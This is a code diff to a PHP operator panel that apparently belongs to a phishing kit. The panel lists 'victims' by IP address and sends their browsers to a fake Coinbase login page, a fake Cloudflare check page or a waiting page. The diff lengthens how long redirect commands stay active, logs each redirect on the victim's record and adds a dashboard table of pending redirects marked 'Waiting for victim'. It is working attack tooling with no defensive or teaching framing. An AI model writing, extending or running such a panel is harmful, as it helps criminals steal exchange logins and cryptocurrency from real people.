@@ -109,25 +109,41 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             switch($command) {
                 case 'redirect_to_coinbase':
                     $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
-                             VALUES ('redirect', 'coinbaselogin.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
+                             VALUES ('redirect', 'coinbaselogin.php', :victim_ip, NOW() + INTERVAL '1 minute')";
                     $stmt = $db->prepare($query);
                     $stmt->execute([':victim_ip' => $victim_ip]);
+                    
+                    // Also immediately update victim's last activity to force detection
+                    $update_victim = "UPDATE victims SET page_visited = 'redirecting_to_coinbase' WHERE ip_address = :victim_ip";
+                    $update_stmt = $db->prepare($update_victim);
+                    $update_stmt->execute([':victim_ip' => $victim_ip]);
+                    
                     $_SESSION['success_message'] = 'Redirect command sent to Coinbase for IP: ' . $victim_ip;
                     break;
                     
                 case 'redirect_to_cloudflare':
                     $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
-                             VALUES ('redirect', 'index.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
+                             VALUES ('redirect', 'index.php', :victim_ip, NOW() + INTERVAL '1 minute')";
                     $stmt = $db->prepare($query);
                     $stmt->execute([':victim_ip' => $victim_ip]);
+                    
+                    $update_victim = "UPDATE victims SET page_visited = 'redirecting_to_cloudflare' WHERE ip_address = :victim_ip";
+                    $update_stmt = $db->prepare($update_victim);
+                    $update_stmt->execute([':victim_ip' => $victim_ip]);
+                    
                     $_SESSION['success_message'] = 'Redirect command sent to Cloudflare for IP: ' . $victim_ip;
                     break;
 
                 case 'redirect_to_waiting':
                     $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
-                             VALUES ('redirect', 'waiting.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
+                             VALUES ('redirect', 'waiting.php', :victim_ip, NOW() + INTERVAL '1 minute')";
                     $stmt = $db->prepare($query);
                     $stmt->execute([':victim_ip' => $victim_ip]);
+                    
+                    $update_victim = "UPDATE victims SET page_visited = 'redirecting_to_waiting' WHERE ip_address = :victim_ip";
+                    $update_stmt = $db->prepare($update_victim);
+                    $update_stmt->execute([':victim_ip' => $victim_ip]);
+                    
                     $_SESSION['success_message'] = 'Redirect command sent to Waiting Page for IP: ' . $victim_ip;
                     break;
                     
@@ -219,6 +235,18 @@ try {
     $total_victims = 0;
 }
 
+// Get pending redirect commands
+$pending_redirects = [];
+try {
+    $pending_query = "SELECT victim_ip, target, created_at FROM redirect_commands 
+                     WHERE executed = FALSE AND expires_at > NOW() 
+                     ORDER BY created_at DESC";
+    $pending_stmt = $db->query($pending_query);
+    $pending_redirects = $pending_stmt->fetchAll(PDO::FETCH_ASSOC);
+} catch (Exception $e) {
+    error_log("Failed to get pending redirects: " . $e->getMessage());
+}
+
 // Handle messages from session
 if (isset($_SESSION['success_message'])) {
     $success_message = $_SESSION['success_message'];
@@ -296,7 +324,7 @@ if (isset($_SESSION['error_message'])) {
         }
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 15px;
             margin-bottom: 20px;
         }
@@ -361,6 +389,20 @@ if (isset($_SESSION['error_message'])) {
         .refresh-btn.paused:hover {
             background: #e68900;
         }
+        .pending-redirect {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 3px solid #FFC107;
+        }
+        .redirect-status {
+            font-size: 11px;
+            padding: 2px 6px;
+            border-radius: 3px;
+            background: #4CAF50;
+            color: white;
+        }
+        .redirect-status.pending {
+            background: #FF9800;
+        }
     </style>
 </head>
 <body>
@@ -398,8 +440,47 @@ if (isset($_SESSION['error_message'])) {
                     <div class="stat-number"><?php echo $current_case_id ?: 'Not Set'; ?></div>
                     <div class="stat-label">Case ID</div>
                 </div>
+                <div class="stat-card">
+                    <div class="stat-number"><?php echo count($pending_redirects); ?></div>
+                    <div class="stat-label">Pending Redirects</div>
+                </div>
             </div>
         </div>
+
+        <!-- Pending Redirects -->
+        <?php if (count($pending_redirects) > 0): ?>
+        <div class="card">
+            <h5>⏳ Pending Redirect Commands</h5>
+            <table class="victim-table">
+                <thead>
+                    <tr>
+                        <th>Victim IP</th>
+                        <th>Target Page</th>
+                        <th>Command Time</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php foreach ($pending_redirects as $redirect): ?>
+                        <tr class="pending-redirect">
+                            <td>
+                                <span class="ip-address"><?php echo htmlspecialchars($redirect['victim_ip']); ?></span>
+                            </td>
+                            <td>
+                                <strong><?php echo htmlspecialchars($redirect['target']); ?></strong>
+                            </td>
+                            <td>
+                                <small><?php echo date('H:i:s', strtotime($redirect['created_at'])); ?></small>
+                            </td>
+                            <td>
+                                <span class="redirect-status pending">Waiting for victim</span>
+                            </td>
+                        </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </div>
+        <?php endif; ?>
 
         <!-- Live Victims -->
         <div class="card">
